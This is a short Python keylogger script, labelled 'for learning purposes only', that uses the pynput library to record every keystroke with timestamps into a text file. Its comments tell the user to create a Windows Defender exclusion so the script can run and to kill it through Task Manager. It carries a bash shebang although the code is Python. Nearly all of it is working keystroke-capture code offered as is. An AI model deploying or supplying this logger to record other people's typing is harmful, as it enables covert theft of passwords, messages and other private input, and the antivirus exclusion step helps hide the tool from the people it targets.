#!/bin/bash




# this is for learning purposes only.
# this is a key logger
# must create an exclusion for this script in Windows Defender


# import libries

#python librarys for recording user input
import os
import pynput
import time

# import listener and key  "tools" from pynput library
from pynput.keyboard import Key
from pynput.keyboard import Listener
# python library to be able to log files.
#log key strokes to txt file.
import logging


# script starts
# Tell where to save the logs

log_directory = ""
#store log file and name it.
#In the log file record time of eack keystroke and Logging level
logging.basicConfig(filename=(log_directory + "Logged_Keys_Here.txt"), level = logging.DEBUG, format='%(asctime)s: %(message)s')


# This allows keyboard presses as inputs.
#uses the ON_PRESS function
# this records every key stroke as an individual event.
def on_press(key):
    logging.info(str(key))

# create listener and to listen for key presss
#when Listener(on_press = on_press) as listener:
#listener.join()


with Listener(on_press=on_press) as listener:
    listener.join()

#this must be killed in task manager.
# look for python application and kill it. 
